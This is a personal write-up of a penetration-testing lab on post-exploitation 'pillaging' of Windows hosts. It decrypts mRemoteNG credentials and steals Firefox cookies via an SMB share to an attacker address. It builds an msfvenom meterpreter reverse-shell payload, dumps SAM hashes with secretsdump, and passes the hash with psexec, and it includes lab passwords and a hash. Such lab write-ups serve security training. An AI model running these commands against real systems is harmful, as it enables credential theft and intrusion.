# [Pillaging](Pillaging.md)
### Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?

```Powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
![](Screenshot%202026-08-24%20at%2014.51.02.png)
### Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?

```powershell
ls C:\Users\Peter\AppData\Roaming\mRemoteNG
```
![](Screenshot%202026-08-24%20at%2014.53.59.png)

```powershell
Select-String -Path .\confCons.xml -Pattern "Grace" -Context 2,5
```
![](Screenshot%202026-08-24%20at%2014.59.43.png)

```shell
python3 mremoteng_decrypt.py -f ~/pass
```
![](Screenshot%202026-08-24%20at%2015.02.31.png)
### Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
![](Screenshot%202026-08-24%20at%2015.18.14.png)

```shell
sudo impacket-smbserver share . -smb2support
```
![](Screenshot%202026-08-24%20at%2015.21.15.png)

```powershell
copy "cookies.sqlite" \\10.10.15.133\share\
```
![](Screenshot%202026-08-24%20at%2015.23.04.png)

```shell
python3 cookieextractor.py --dbpath ./cookies.sqlite --host slack --cookie d
```
![](Screenshot%202026-08-24%20at%2015.25.04.png)

Add the cookie above and get the flag
![](Screenshot%202026-08-24%20at%2015.34.15.png)
### Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.

Login Jeff with credential `Username: jeff and Password Webmaster001!`
![](Screenshot%202026-08-24%20at%2015.45.24.png)
### Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.

Set password
![](Screenshot%202026-08-24%20at%2015.46.08.png)

Check snapshots
```powershell
restic.exe -r E:\restic2\ snapshots
```
![](Screenshot%202026-08-24%20at%2016.02.53.png)

Restore file
```powershell
restic.exe -r E:\restic restore 24504d3d --target C:\Restore
```
![](Screenshot%202026-08-24%20at%2016.04.22.png)
![](Screenshot%202026-08-24%20at%2016.08.30.png)

Create payload via `msfvenom`
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.133 LPORT=1234 -o backup.exe -f exe
```
![](Screenshot%202026-08-24%20at%2016.13.06.png)

Setup listener
![](Screenshot%202026-08-24%20at%2016.14.25.png)

Get a shell
![](Screenshot%202026-08-24%20at%2016.15.06.png)

Download files
![](Screenshot%202026-08-24%20at%2016.16.44.png)

I got `SAM, SYSTEM, SECURITY`, I gonna dump hash
```shell
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```
![](Screenshot%202026-08-24%20at%2016.18.35.png)
### Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete.

```shell
impacket-psexec Administrator@10.129.127.140 -hashes aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26
```
![](Screenshot%202026-08-24%20at%2016.22.32.png)